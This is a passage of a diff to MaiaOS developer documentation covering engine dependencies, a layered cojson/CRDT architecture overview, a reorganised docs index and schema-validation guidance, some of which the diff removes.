+    ViewEngine --> ActorEngine
+    StyleEngine --> ActorEngine
+    DBEngine --> SubscriptionEngine
+    SubscriptionEngine --> ActorEngine
+    ActorEngine --> ViewEngine
+```
+
+**Dependency Flow:**
+1. `ModuleRegistry` loads modules and registers tools
+2. `MaiaScriptEvaluator` evaluates expressions (used by all engines)
+3. `ToolEngine` executes tools (used by StateEngine and ActorEngine)
+4. `StateEngine` interprets state machines (used by ActorEngine)
+5. `ViewEngine` renders UI (used by ActorEngine)
+6. `StyleEngine` compiles styles (used by ActorEngine)
+7. `ActorEngine` orchestrates everything
+8. `DBEngine` handles data operations
+9. `SubscriptionEngine` manages reactive subscriptions (used by ActorEngine)
+
+---
+
+## Documentation Structure
+
+This package documentation is organized into focused topics:
+
+- **[engines.md](./engines.md)** - Detailed descriptions of all 10 engines
+- **[modules.md](./modules.md)** - Module system and creating custom modules
+- **[expressions.md](./expressions.md)** - MaiaScript expression language reference
+- **[api-reference.md](./api-reference.md)** - Complete API reference
+- **[patterns.md](./patterns.md)** - Common patterns and troubleshooting
+
+---
+
+## Quick Start
+
+Here's a simple example of using engines directly:
+
+```javascript
+import { MaiaScriptEvaluator } from '@MaiaOS/script';
+
+const evaluator = new MaiaScriptEvaluator();
+
+// Evaluate a simple expression
+const result = await evaluator.evaluate(
+  { $if: { condition: { $eq: ['$context.status', 'active'] }, then: 'green', else: 'gray' } },
+  { context: { status: 'active' } }
+);
+// Returns: 'green'
+```
+
+For full system usage, see the [maia-kernel Package](../02_maia-kernel/README.md).
+
+---
+
+## Related Documentation
+
+- [maia-kernel Package](../02_maia-kernel/README.md) - Boot process and orchestration
+- [maia-schemata Package](../03_maia-schemata/README.md) - Schema validation
+- [DSL Fundamentals](../02_dsl.md) - MaiaScript language reference
+- [Engines](../04_engines.md) - High-level engine overview
+
+---
+
+## Source Files
+
+**Package:** `libs/maia-script/`
+
+**Key Files:**
+- `src/index.js` - Public API exports
+- `src/engines/` - All engine implementations
+- `src/modules/` - Module definitions
+- `src/utils/` - Shared utilities
+
+**Dependencies:**
+- `@MaiaOS/tools` - Tool definitions
+- `@MaiaOS/schemata` - Schema validation
+- `@MaiaOS/db` - Database layer
+
+---
+
+# MAIA DB/COJSON
+
+*Source: developers/05_maia-db/cojson.md*
+
+# cojson/CRDT Architecture
+
+**Complete hierarchy from lowest-level primitives to high-level CoValues**
+
+
+---
+
+## Overview
+
+This document maps the complete cojson architecture from cryptographic primitives (Layer 0) to application-level CoValues (Layer 7+), showing what composes what and how the CRDT system works under the hood.
+
+---
+
+## Architecture Layers (Lowest → Highest)
+
+```
+┌─────────────────────────────────────────────────────────────┐
+│ LAYER 0: CRYPTOGRAPHIC PRIMITIVES                          │
+├─────────────────────────────────────────────────────────────┤
+│ • Hash (Blake3)                                             │
+│ • Signature (Ed25519)                                       │
+│ • Encryption (XSalsa20, X25519)                             │
+│ • KeyID, KeySecret, SignerID                                │
+└─────────────────────────────────────────────────────────────┘
+                         ↓
+┌─────────────────────────────────────────────────────────────┐
+│ LAYER 1: IDENTIFIERS                                        │
+├─────────────────────────────────────────────────────────────┤
+│ • RawCoID: "co_z..." (CoValue ID)                           │
+│ • SessionID: "co_zXXX_session_zYYY"                         │
+│ • TransactionID: SessionID + txIndex                        │
+│ • AgentID: "signer_z..." or "sealer_z..."                   │
+└─────────────────────────────────────────────────────────────┘
+                         ↓
+┌─────────────────────────────────────────────────────────────┐
+│ LAYER 2: TRANSACTIONS & OPERATIONS                         │
+├─────────────────────────────────────────────────────────────┤
+│ • Transaction: Single atomic change                         │
+│   - madeAt: timestamp                                       │
+│   - changes: JsonValue[] (encrypted ops)                    │
+│   - meta: JsonObject (transaction metadata)                 │
+│ • VerifiedTransaction: Validated transaction                │
+└─────────────────────────────────────────────────────────────┘
+                         ↓
+┌─────────────────────────────────────────────────────────────┐
+│ LAYER 3: CORE VALUE HEADER & VERIFIED STATE               │
+├─────────────────────────────────────────────────────────────┤
+│ • CoValueHeader:                                            │
+│   - type: "comap" | "colist" | "costream" | "coplaintext"   │
+│   - ruleset: ownership/permissions rules                    │
+│   - meta: headerMeta (JsonObject | null)                    │
+│   - createdAt: timestamp                                    │
+│                                                             │
+│ • VerifiedState: Validated header + transactions            │
+│   - header: CoValueHeader                                   │
+│   - sessions: Map<SessionID, Transaction[]>                 │
+└─────────────────────────────────────────────────────────────┘
+                         ↓
+┌─────────────────────────────────────────────────────────────┐
+│ LAYER 4: CoValueCore (The CRDT Engine)                     │
+├─────────────────────────────────────────────────────────────┤
+│ • CoValueCore: Low-level CRDT state machine                 │
+│   - id: RawCoID                                             │
+│   - verified: VerifiedState                                 │
+│   - node: LocalNode                                         │
+│   - Methods:                                                │
+│     • processTransaction()                                  │
+│     • getCurrentContent() → RawCoValue                      │
+│     • subscribe()                                           │
+│     • createBranch()                                        │
+│     • mergeBranch()                                         │
+│                                                             │
+│ ** THIS IS WHERE THE CRDT MAGIC HAPPENS **                  │
+│ All conflict resolution, merging, and sync                  │
+└─────────────────────────────────────────────────────────────┘
+                         ↓
+┌─────────────────────────────────────────────────────────────┐
+│ LAYER 5: RawCoValue (Base Interface)                       │
+├─────────────────────────────────────────────────────────────┤
+│ Common interface for ALL CoValue types:                     │
+│ • id: CoID<T>                                               │
+│ • core: CoValueCore                                         │
+│ • type: string                                              │
+│ • headerMeta: JsonObject | null  ← YOUR $schema HERE!       │
+│ • group: RawGroup                                           │
+│ • toJSON(): JsonValue                                       │
+│ • subscribe()                                               │
+└─────────────────────────────────────────────────────────────┘
+                         ↓
+          ┌──────────────┴──────────────┐
+          ↓                             ↓
+┌─────────────────────┐    ┌─────────────────────────┐
+│ LAYER 6A:           │    │ LAYER 6B:               │
+│ BASE CRDT TYPES     │    │ SPECIAL CRDT TYPES      │
+├─────────────────────┤    ├─────────────────────────┤
+│ 1. RawCoMap         │    │ 1. RawCoList            │
+│    type: "comap"    │    │    type: "colist"       │
+│    ↓                │    │    • Ordered CRDT list  │
+│    Key-value CRDT   │    │    • insert/delete/move │
+│    with ops:        │    │                         │
+│    • set(k, v)      │    │ 2. RawCoPlainText       │
+│    • delete(k)      │    │    type: "coplaintext"  │
+│    • get(k)         │    │    • Character CRDT     │
+│                     │    │    • append/insert/del  │
+│ 2. RawCoStream      │    │                         │
+│    type: "costream" │    │ 3. RawBinaryCoStream    │
+│    ↓                │    │    type: "costream"     │
+│    Append-only log  │    │    meta: {type:"binary"}│
+│    • push(item)     │    │    • Binary chunks      │
+│    • Session-based  │    │    • push(Uint8Array)   │
+│                     │    │                         │
+└─────────────────────┘    └─────────────────────────┘
+          ↓
+┌─────────────────────────────────────────────────────────────┐
+│ LAYER 7: SPECIALIZED CoMaps (Subclasses)                   │
+├─────────────────────────────────────────────────────────────┤
+│ RawGroup extends RawCoMap                                   │
+│   type: "comap"                                             │
+│   ruleset.type: "group"                                     │
+│   headerMeta: null (no schema, cojson limitation)           │
+│   Special methods:                                          │
+│   • addMember(agent, role)                                  │
+│   • createMap(init, meta) → RawCoMap                        │
+│   • createList(init, meta) → RawCoList                      │
+│   • createStream(meta) → RawCoStream                        │
+│   • createBinaryStream(meta) → RawBinaryCoStream            │
+│   • createPlainText(text, meta) → RawCoPlainText            │
+│                                                             │
+│ RawAccount extends RawCoMap                                 │
+│   type: "comap"                                             │
+│   ruleset.type: "group" (yes, Account IS a Group!)          │
+│   headerMeta: {type: "account"} (built-in cojson)           │
+│   Special properties:                                       │
+│   • profile: CoID<RawCoMap>                                 │
+│   • Keys for crypto (sealer, signer, readKey)               │
+│                                                             │
+│ Profile (just a RawCoMap with convention)                   │
+│   type: "comap"                                             │
+│   headerMeta: {$schema: "ProfileSchema"} (by YOU!)          │
+│   Typical properties:                                       │
+│   • name: string                                            │
+│   • ... (any JSON data)                                     │
+└─────────────────────────────────────────────────────────────┘
+```
+
+---
+
+## Core Type System
+
+### Type Discrimination Logic
+
+From `coreToCoValue.ts` - how cojson determines which class to instantiate:
+
+```typescript
+if (type === "comap") {
+  if (ruleset === "group") {
+    if (meta.type === "account") → RawAccount
+    else → RawGroup
+  } else → RawCoMap
+}
+else if (type === "colist") → RawCoList
+else if (type === "costream") {
+  if (meta.type === "binary") → RawBinaryCoStream
+  else → RawCoStream
+}
+else if (type === "coplaintext") → RawCoPlainText
+```
+
+---
+
+## What Composes What
+
+```
+Account (CoMap + special meta)
+  ↳ owns → Group (CoMap + group ruleset)
+      ↳ creates → Profile (CoMap with your schema)
+      ↳ creates → ProfileList (CoList with your schema)
+      ↳ creates → ActivityStream (CoStream with your schema)
+      ↳ creates → AvatarStream (BinaryCoStream with your schema)
+      ↳ creates → BioText (CoPlainText with your schema)
+```
+
+---
+
+## The 4 Base CRDT Types
+
+| Type | Internal Structure | Operations | Use Case |
+|------|-------------------|------------|----------|
+| **CoMap** | `Map<string, JsonValue>` | set, delete, get | Objects, documents |
+| **CoList** | Ordered list with CRDT positions | insert, delete, move | Arrays, todo lists |
+| **CoStream** | Session-based append log | push (append-only) | Events, messages, logs |
+| **CoPlainText** | Character-based CRDT | append, insert, delete | Text editing, documents |
+
+---
+
+## CoStream vs CoList - Key Differences
+
+### CoList (Collaborative List)
+- **Ordered collection** with **positional editing**
+- Can **insert, delete, move** items at specific indices
+- Items can be **reordered**
+- **Structure**: `[item1, item2, item3]`
+- **Use cases**: Todo lists, ordered collections, reorderable arrays
+
+### CoStream (Append-Only Log)
+- **Immutable append-only** log
+- Items organized by **session** (who wrote them)
+- **Cannot delete or edit** once pushed
+- **Structure**: `{ session_id: [items...], another_session: [items...] }`
+- **Use cases**: Activity logs, chat messages, audit trails, event sourcing
+
+### BinaryCoStream
+- Same as CoStream but for **binary data** (Uint8Array)
+- Push **chunks of bytes**
+- **Use cases**: Images, files, video streams, audio
+
+---
+
+## Your Schema Layer (Layer 8)
+
+MaiaOS extends cojson with a schema system using `headerMeta`:
+
+```
+headerMeta: { $schema: "YourSchema" }  ← Layer 8: YOUR APPLICATION
+         ↓
+    RawCoValue (Layer 5)
+         ↓
+    CoValueCore (Layer 4) ← The CRDT magic happens here
+         ↓
+    Transactions (Layer 2) ← Synced across peers
+```
+
+### Why This Works
+
+- **Proven CRDT primitives** (Layer 4) handle all conflict resolution
+- **Your schema system** (Layer 8) adds semantic meaning
+- **Zero breaking changes** to cojson - pure extension via `headerMeta`
+- **Type-safe** through `$schema` references
+- **Inspectable** - all schemas visible in CoValue metadata
+
+---
+
+## Example: Full Stack
+
+### Creating a Profile
+
+```javascript
+// Layer 8: Your schema
+const profileMeta = { $schema: "ProfileSchema" };
+
+// Layer 7: Create via Group
+const profile = group.createMap({ name: "Alice" }, profileMeta);
+
+// Layer 6: RawCoMap instance
+// Layer 5: Implements RawCoValue interface
+// Layer 4: CoValueCore handles CRDT operations
+// Layer 3: Header + VerifiedState
+// Layer 2: Transactions synced
+// Layer 1: IDs generated
+// Layer 0: Crypto operations
+```
+
+### Resulting CoValue
+
+```javascript
 {
-  "properties": {
-    "text": { "type": "string", "minLength": 1 },
-    "done": { "type": "boolean" }
+  id: "co_z...",              // Layer 1
+  type: "comap",              // Layer 5
+  headerMeta: {               // Layer 8 (YOUR LAYER!)
+    $schema: "ProfileSchema"
   },
-  "required": ["text", "done"]
-}
-
-// Then use in operations
-await maia.db({ op: 'create', schema: '@schema/todos', data: {...} });
-```
-
-### 2. Use Descriptive Error Messages
-
-Add `description` fields to schema properties:
-
-```json
-{
-  "properties": {
-    "text": {
-      "type": "string",
-      "minLength": 1,
-      "description": "The todo item text content (required, non-empty)"
-    }
-  }
+  group: RawGroup,            // Layer 7
+  core: CoValueCore           // Layer 4 (CRDT engine)
 }
 ```
 
-### 3. Be Permissive Initially
+---
 
-Start with permissive schemas, tighten later:
+## Key Insights
 
-```json
-// ✅ Good - Start permissive
-{
-  "properties": {
-    "text": { "type": "string" }  // No minLength initially
-  }
-}
+1. **Account IS a Group** - with special `meta.type = "account"`
+2. **BinaryCoStream IS a CoStream** - with special `meta.type = "binary"`
+3. **Groups can't have schemas** - `createGroup()` hardcodes `meta: null`
+4. **Accounts have built-in meta** - cojson sets `{type: "account"}` automatically
+5. **Everything else supports schemas** - CoMap, CoList, CoStream, CoPlainText via `meta` parameter
 
-// Tighten later after testing
-{
-  "properties": {
-    "text": { "type": "string", "minLength": 1 }  // Add constraint
-  }
-}
-```
+---
 
-### 4. Validate at Boundaries
+## References
 
-Validation happens at operation boundaries (not on every property access):
+- **Source**: `libs/maia-db/node_modules/cojson/src/`
+  - `coValue.ts` - RawCoValue interface
+  - `coreToCoValue.ts` - Type discrimination logic
+  - `coValueCore/coValueCore.ts` - CRDT engine
+  - `coValues/` - All CoValue implementations
 
-```javascript
-// ✅ Good - Validate at operation boundary
-await maia.db({ op: 'create', schema: '@schema/todos', data: todoData });
-
-// ❌ Bad - Don't validate individual properties
-// (Validation happens automatically, don't add manual checks)
-```
-
-### 5. Handle Validation Errors Gracefully
-
-Catch validation errors and provide user-friendly messages:
-
-```javascript
-try {
-  await maia.db({ op: 'create', schema: '@schema/todos', data });
-} catch (error) {
-  if (error.message.includes('Validation failed')) {
-    // Show user-friendly error
-    showError('Invalid todo data. Please check your input.');
-  } else {
-    throw error; // Re-throw other errors
-  }
-}
-```
-
-## Adding New Validation
-
-### Adding a New Data Schema
-
-1. **Create schema file:**
-   ```bash
-   # Create src/schemata/data/yourtype.schema.json
-   ```
-
-2. **Define schema:**
-   ```json
-   {
-     "$id": "https://maiaos.dev/schemas/data/yourtype",
-     "$schema": "http://json-schema.org/draft-07/schema#",
-     "type": "object",
-     "properties": {
-       "field1": { "type": "string" },
-       "field2": { "type": "number" }
-     },
-     "required": ["field1"]
-   }
-   ```
-
-3. **Export in index.js:**
-   ```javascript
-   import yourtypeSchema from './data/yourtype.schema.json';
-   const DATA_SCHEMAS = {
-     'data/todos': todosSchema,
-     'data/yourtype': yourtypeSchema
-   };
-   ```
-
-4. **Use in operations:**
-   ```javascript
-   await maia.db({
-     op: 'create',
-     schema: '@schema/yourtype',
-     data: { field1: "value", field2: 123 }
-   });
-   ```
-
-### Adding Validation to New Operation
-
-1. **Import validation helper:**
-   ```javascript
-   import { validateOrThrow } from '../../../schemata/validation.helper.js';
-   ```
-
-2. **Load schema from IndexedDB:**
-   ```javascript
-   const schemaKey = '@schema/data/yourtype';
-   const schema = await this._loadDataSchema(schemaKey);
-   ```
-
-3. **Validate data:**
-   ```javascript
-   if (schema) {
-     await validateOrThrow('application-data', data, schema);
-   }
-   ```
-
-## Summary
-
-- ✅ **100% validation coverage** - Everything is validated
-- ✅ **Dynamic schemas** - Schemas loaded from IndexedDB at runtime
-- ✅ **Fast performance** - AJV compilation and caching
-- ✅ **Clear errors** - Actionable error messages with field paths
-- ✅ **Fail-fast** - Validation errors throw immediately
-
-For schema definitions, see [Schema System](./03_schemas.md).  
-For engine details, see [Engines Guide](./04_engines.md).
+- **MaiaOS Extensions**:
+  - `libs/maia-db/src/services/` - CoValue creation services
+  - `libs/maia-db/src/utils/meta.js` - Schema metadata utilities
+  - `libs/maia-core/src/o.js` - Inspector with schema support
 
 ---
 
@@ -8661,72 +7699,73 @@ Developer-facing documentation for understanding and extending MaiaOS.
 
 Read the documentation in the following order for a complete understanding:
 
-### 1. [MaiaOS Architecture](./01_maiaos.md)
-**Overview of the entire system**
-- Three-layer architecture (Definition, Execution, Intelligence)
-- Core concepts and design philosophy
-- How the layers interact
+### 1. [maia-self Package](./01_maia-self/README.md)
+**Self-Sovereign Identity and Authentication**
+- Hardware-backed authentication (WebAuthn PRF)
+- Zero-storage architecture (no secrets in browser)
+- Deterministic account derivation
+- Registration and login flows
+- Bottom-up cryptography concepts
+- Security analysis and threat model
 
-### 2. [DSL Fundamentals](./02_dsl.md)
-**MaiaScript Domain-Specific Language**
-- `.maia` file structure and syntax
-- Declarative composition patterns
-- File naming conventions
-- Reference resolution
+**Sub-topics:**
+- [Security Analysis](./01_maia-self/security-analysis.md) - Threat model and attack vectors
+- [Auth Flows](./01_maia-self/auth-flows.md) - Registration and login flows
+- [Cryptography](./01_maia-self/cryptography.md) - Bottom-up crypto concepts
+- [API Reference](./01_maia-self/api-reference.md) - Complete API reference
 
-### 3. [Schemas](./03_schemas.md)
-**Schema definitions and validation**
-- Schema structure (actors, state machines, views, styles, skills)
-- Schema validation and type safety
-- Schema composition and inheritance
-- Best practices
+### 2. [maia-kernel Package](./02_maia-kernel/README.md)
+**Core system services and boot process**
+- Identity & authentication layer (`createMaiaOS`)
+- Actor & DSL execution layer (`MaiaOS.boot()`)
+- Boot process and engine initialization
+- Module loading and database seeding
+- Public API reference
 
-### 3a. [maia-schemata Package](./maia-schemata/README.md)
+**Sub-topics:**
+- [Auth Layer](./02_maia-kernel/auth-layer.md) - Identity & Authentication layer
+- [Boot Process](./02_maia-kernel/boot-process.md) - Boot process and execution layer
+- [API Reference](./02_maia-kernel/api-reference.md) - Complete API reference
+- [Patterns](./02_maia-kernel/patterns.md) - Common patterns and troubleshooting
+
+### 3. [maia-schemata Package](./03_maia-schemata/README.md)
 **Schema validation and transformation system**
 - ValidationEngine implementation details
 - Schema transformation for seeding
 - CoJSON types integration
 - Co-ID generation and registry
 
-### 4. [Engines](./04_engines.md)
-**Execution engines that interpret definitions**
-- ActorEngine - Actor lifecycle management
-- StateEngine - State machine interpreter
-- ViewEngine - View-to-DOM renderer
-- ToolEngine - Tool executor
-- StyleEngine - Style compiler
-- ModuleRegistry - Dynamic module loader
+**Sub-topics:**
+- [Validation](./03_maia-schemata/validation.md) - Schema validation system
+- [Transformation](./03_maia-schemata/transformation.md) - Schema transformation for seeding
+- [CoJSON Integration](./03_maia-schemata/cojson-integration.md) - CoJSON types integration
+- [Co-ID Generation](./03_maia-schemata/co-id-generation.md) - Co-ID generation and registry
 
-### 5. [Composition](./05_composition.md)
-**How to compose components and build features**
-- Actor composition patterns
-- State machine composition
-- View composition
-- Style composition
-- Modular architecture
+### 4. [maia-script Package](./04_maia-script/README.md)
+**Execution engines and modules**
+- Engine architecture and relationships
+- Individual engine details (ActorEngine, ViewEngine, StateEngine, etc.)
+- Module system and custom module creation
+- MaiaScript expression language reference
+- Using engines independently for advanced use cases
+- Complete API reference
 
-### 6. [Reactive Queries](./06_reactive-queries.md)
-**Reactive data system**
-- Query syntax and patterns
-- Reactive updates and subscriptions
-- Data flow and state management
-- Performance optimization
+**Sub-topics:**
+- [Engines](./04_maia-script/engines.md) - Detailed engine descriptions
+- [Modules](./04_maia-script/modules.md) - Module system and custom modules
+- [Expressions](./04_maia-script/expressions.md) - MaiaScript expression language
+- [API Reference](./04_maia-script/api-reference.md) - Complete API reference
+- [Patterns](./04_maia-script/patterns.md) - Common patterns and troubleshooting
 
-### 7. [CoJSON Integration](./07_cojson.md)
+### 5. [maia-db Package](./05_maia-db/cojson.md)
 **CRDT-based collaborative data layer**
-- MaiaCojson architecture
-- JSON Schema wrappers for CRDTs
-- CRUD API (`o.create`, `o.read`, `o.update`, `o.delete`)
-- Real-time collaboration and sync
-- Zero Mocks Policy for testing
+- Complete cojson architecture hierarchy
+- Cryptographic primitives to high-level CoValues
+- CRDT operations and conflict resolution
+- Storage and sync mechanisms
 
-### 8. [Tools](./08_tools.md)
-**Development tools and utilities**
-- CLI tools
-- Build system
-- Testing framework
-- Debugging tools
-- Code generation
+**Sub-topics:**
+- [CoJSON Architecture](./05_maia-db/cojson.md) - Complete layer hierarchy from primitives to CoValues
 
 ---
 
@@ -8751,721 +7790,6 @@ When updating these docs:
 - [Creator Documentation](../creators/) - For creators (user-facing)
 - [Agent Documentation](../agents/) - For LLM agents (auto-generated)
 - [Getting Started](../getting-started/) - Quick start guides
-
----
-
-# VALIDATION ROUNDTRIPS ANALYSIS
-
-*Source: developers/validation-roundtrips-analysis.md*
-
-# Validation Engine & Roundtrips Analysis
-
-Complete analysis of when schemas and entities get validated during seeding, creating, and loading operations, including how `$co` links work.
-
-## Overview
-
-MaiaOS uses **JSON Schema validation** with AJV for all data validation. The validation engine supports:
-- **Schemas**: Validated against meta-schema during seeding
-- **Configs/Instances**: Validated when loaded from IndexedDB
-- **Application Data**: Validated during create/update operations
-- **$co Links**: Custom keyword for CoValue references (validated via AJV plugin)
-
-## Validation Flow Diagram
-
-```
-┌─────────────────────────────────────────────────────────────────┐
-│                        SEEDING PHASE                             │
-└─────────────────────────────────────────────────────────────────┘
-
-1. SCHEMA VALIDATION (Before Seeding)
-   ┌─────────────────────────────────────────────────────────────┐
-   │ kernel.js:boot() → ValidationEngine.validateSchemaAgainstMeta() │
-   │                                                               │
-   │ • All schemas validated against meta-schema                   │
-   │ • Meta-schema: @schema/meta (CoJSON) or draft-2020-12        │
-   │ • Location: libs/maia-script/src/o/kernel.js:103-112          │
-   │ • Throws error if schema invalid                              │
-   └─────────────────────────────────────────────────────────────┘
-                              ↓
-2. SCHEMA TRANSFORMATION (During Seeding)
-   ┌─────────────────────────────────────────────────────────────┐
-   │ IndexedDBBackend.seed() → transformSchemaForSeeding()        │
-   │                                                               │
-   │ • Human-readable IDs (@schema/actor) → co-ids (co_z...)     │
-   │ • $schema references transformed                              │
-   │ • $id references transformed                                  │
-   │ • $co keyword values transformed                              │
-   │ • $ref references transformed                                │
-   │ • Location: libs/maia-schemata/src/schema-transformer.js:14  │
-   └─────────────────────────────────────────────────────────────┘
-                              ↓
-2.5. SCHEMA VALIDATION (After Transformation)
-   ┌─────────────────────────────────────────────────────────────┐
-   │ IndexedDBBackend.seed() → ValidationEngine.validateSchemaAgainstMeta() │
-   │                                                               │
-   │ • Transformed schemas validated against their $schema meta-schema │
-   │ • Meta-schema loaded from in-memory map or DB                │
-   │ • Ensures transformation didn't introduce errors             │
-   │ • Location: libs/maia-script/src/o/engines/db-engine/        │
-   │   backend/indexeddb.js:146-175                                │
-   │ • Throws error if validation fails                           │
-   └─────────────────────────────────────────────────────────────┘
-                              ↓
-3. SCHEMA STORAGE (Validated)
-   ┌─────────────────────────────────────────────────────────────┐
-   │ IndexedDBBackend._seedSchemas()                              │
-   │                                                               │
-   │ • Schemas stored with co-ids as keys                         │
-   │ • Already validated in steps 1 and 2.5                       │
-   │ • Location: libs/maia-script/src/o/engines/db-engine/        │
-   │   backend/indexeddb.js:671                                   │
-   └─────────────────────────────────────────────────────────────┘
-                              ↓
-4. INSTANCE TRANSFORMATION (During Seeding)
-   ┌─────────────────────────────────────────────────────────────┐
-   │ IndexedDBBackend.seed() → transformInstanceForSeeding()      │
-   │                                                               │
-   │ • Human-readable references → co-ids                        │
-   │ • $schema references transformed                             │
-   │ • $id set to co-id                                           │
-   │ • Reference properties (actor, context, view) transformed   │
-   │ • Query objects transformed                                  │
-   │ • Location: libs/maia-schemata/src/schema-transformer.js:145 │
-   └─────────────────────────────────────────────────────────────┘
-                              ↓
-4.5. INSTANCE VALIDATION (After Transformation)
-   ┌─────────────────────────────────────────────────────────────┐
-   │ IndexedDBBackend.seed() → validateAgainstSchemaOrThrow()     │
-   │                                                               │
-   │ • Transformed instances validated against their $schema schema │
-   │ • Schema loaded from DB (seeded in Phase 3)                  │
-   │ • Ensures transformation didn't introduce errors             │
-   │ • Location: libs/maia-script/src/o/engines/db-engine/        │
-   │   backend/indexeddb.js:378-420                                │
-   │ • Throws error if validation fails                           │
-   └─────────────────────────────────────────────────────────────┘
-                              ↓
-5. INSTANCE STORAGE (Validated)
-   ┌─────────────────────────────────────────────────────────────┐
-   │ IndexedDBBackend._seedConfigs()                              │
-   │                                                               │
-   │ • Configs stored with co-ids as keys                         │
-   │ • Already validated in Phase 4.5                             │
-   │ • Also validated on load (runtime check)                     │
-   │ • Location: libs/maia-script/src/o/engines/db-engine/        │
-   │   backend/indexeddb.js:541                                    │
-   └─────────────────────────────────────────────────────────────┘
-
-
-┌─────────────────────────────────────────────────────────────────┐
-│                        LOADING PHASE                             │
-└─────────────────────────────────────────────────────────────────┘
-
-6. CONFIG/INSTANCE VALIDATION (On Load)
-   ┌─────────────────────────────────────────────────────────────┐
-   │ ActorEngine.loadActor() → validateAgainstSchemaOrThrow()     │
-   │ StateEngine.loadStateDef() → validateOrThrow()                │
-   │ ViewEngine.loadView() → validateOrThrow()                    │
-   │                                                               │
-   │ • Schema loaded from IndexedDB via loadSchemaFromDB()        │
-   │ • Instance validated against schema                         │
-   │ • Throws error if validation fails                           │
-   │ • Location:                                                  │
-   │   - libs/maia-script/src/o/engines/actor-engine/            │
-   │     actor.engine.js:73-110                                   │
-   │   - libs/maia-script/src/o/engines/state-engine/            │
-   │     state.engine.js:34-61                                    │
-   └─────────────────────────────────────────────────────────────┘
-
-
-┌─────────────────────────────────────────────────────────────────┐
-│                      CREATING PHASE                              │
-└─────────────────────────────────────────────────────────────────┘
-
-7. APPLICATION DATA VALIDATION (On Create/Update)
-   ┌─────────────────────────────────────────────────────────────┐
-   │ CreateOperation.execute() → validateAgainstSchemaOrThrow()    │
-   │ UpdateOperation.execute() → validateAgainstSchemaOrThrow()   │
-   │                                                               │
-   │ • Schema loaded from IndexedDB via loadSchemaFromDB()        │
-   │ • Data validated against schema before storage               │
-   │ • Throws error if validation fails                           │
-   │ • Location:                                                  │
-   │   - libs/maia-script/src/o/engines/db-engine/               │
-   │     operations/create.js:36-42                               │
-   │   - libs/maia-script/src/o/engines/db-engine/               │
-   │     operations/update.js:41-47                               │
-   └─────────────────────────────────────────────────────────────┘
-```
-
-## Detailed Validation Points
-
-### 1. Schema Validation During Seeding
-
-**When:** Before schemas are stored in IndexedDB  
-**Where:** `libs/maia-script/src/o/kernel.js:97-113`  
-**What:** All schemas validated against meta-schema
-
-```javascript
-// kernel.js:boot()
-const validationEngine = new ValidationEngine();
-await validationEngine.initialize();
-
-console.log('🔍 Validating schemas against meta schema...');
-for (const [name, schema] of Object.entries(schemas)) {
-  const result = await validationEngine.validateSchemaAgainstMeta(schema);
-  if (!result.valid) {
-    const errorDetails = result.errors
-      .map(err => `  - ${err.instancePath}: ${err.message}`)
-      .join('\n');
-    console.error(`❌ Schema '${name}' failed meta schema validation:\n${errorDetails}`);
-    throw new Error(`Schema '${name}' is not valid JSON Schema`);
-  }
-}
-```
-
-**Meta-Schema Types:**
-- `@schema/meta` - CoJSON custom meta-schema (requires `cotype` at root)
-- `https://json-schema.org/draft/2020-12/schema` - Standard JSON Schema meta-schema
-
-**What Gets Validated:**
-- Schema structure (properties, type, etc.)
-- Required fields (`$schema`, `$id`)
-- `cotype` keyword (must be `comap`, `colist`, or `costream` at root)
-- `$co` keyword syntax (human-readable ID or co-id)
-- `$ref` references (validated during schema compilation)
-
-### 2. Schema Transformation During Seeding
-
-**When:** After initial schema validation, before Phase 2.5 validation  
-**Where:** `libs/maia-schemata/src/schema-transformer.js:14-79`  
-**What:** Human-readable IDs → co-ids
-
-**Transformation Targets:**
-- `$schema` field: `@schema/meta` → `co_z...`
-- `$id` field: `@schema/actor` → `co_z...`
-- `$co` keyword values: `@schema/actor` → `co_z...`
-- `$ref` references: `@schema/actor` → `co_z...`
-- Nested schemas in `properties`, `$defs`, `items`, `allOf`, `anyOf`, `oneOf`
-
-**Example:**
-```javascript
-// Before transformation
-{
-  "$schema": "@schema/meta",
-  "$id": "@schema/actor",
-  "cotype": "comap",
-  "properties": {
-    "view": {
-      "$co": "@schema/view"  // Human-readable reference
-    }
-  }
-}
-
-// After transformation
-{
-  "$schema": "co_z123...",  // Meta-schema co-id
-  "$id": "co_z456...",      // Actor schema co-id
-  "cotype": "comap",
-  "properties": {
-    "view": {
-      "$co": "co_z789..."   // View schema co-id
-    }
-  }
-}
-```
-
-### 2.5. Schema Validation After Transformation
-
-**When:** After schema transformation, before storage  
-**Where:** `libs/maia-script/src/o/engines/db-engine/backend/indexeddb.js:146-175`  
-**What:** Transformed schemas validated against their `$schema` meta-schema
-
-```javascript
-// Phase 2.5: Validate transformed schemas against their $schema meta-schema
-const { ValidationEngine } = await import('@MaiaOS/schemata/validation.engine.js');
-const validationEngine = new ValidationEngine();
-
-// Set up schema resolver for loading meta-schemas
-validationEngine.setSchemaResolver(async (schemaKey) => {
-  // First check if it's in the transformed schemas map (being seeded)
-  if (schemaKey.startsWith('co_z')) {
-    for (const schema of Object.values(transformedSchemas)) {
-      if (schema.$id === schemaKey) {
-        return schema;
-      }
-    }
-  }
-  // Fallback: try to load from DB (if already stored)
-  return await this.getSchema(schemaKey);
-});
-
-await validationEngine.initialize();
-
-// Validate each transformed schema
-for (const [name, schema] of Object.entries(transformedSchemas)) {
-  const result = await validationEngine.validateSchemaAgainstMeta(schema);
-  if (!result.valid) {
-    const errorDetails = result.errors
-      .map(err => `  - ${err.instancePath}: ${err.message}`)
-      .join('\n');
-    throw new Error(`Transformed schema '${name}' failed validation:\n${errorDetails}`);
-  }
-}
-```
-
-**What Gets Validated:**
-- Transformed schema structure is still valid
-- `$schema` co-id reference is valid (meta-schema exists)
-- Transformation didn't introduce errors
-- All `$co` references resolve correctly
-
-**Why This Matters:**
-- Catches transformation errors before storage
-- Ensures data integrity from the start
-- Prevents invalid schemas from being stored
-
-### 3. Instance Transformation During Seeding
-
-**When:** After schema transformation, before instance storage  
-**Where:** `libs/maia-schemata/src/schema-transformer.js:145-302`  
-**What:** Human-readable references → co-ids
-
-**Transformation Targets:**
-- `$schema` field: `@schema/actor` → `co_z...`
-- `$id` field: `@actor/vibe` → `co_z...` (set to co-id)
-- Reference properties: `actor`, `context`, `view`, `state`, `interface`, `brand`, `style`
-- `children` object: `@actor/child` → `co_z...`
-- `items` arrays (subscriptions, inbox): `@actor/vibe` → `co_z...`
-- Query objects: `{schema: "@schema/todos"}` → `{schema: "co_z..."}`
-- Tool payloads: `{target: "@actor/vibe"}` → `{target: "co_z..."}`
-
-**Example:**
-```javascript
-// Before transformation
-{
-  "$schema": "@schema/actor",
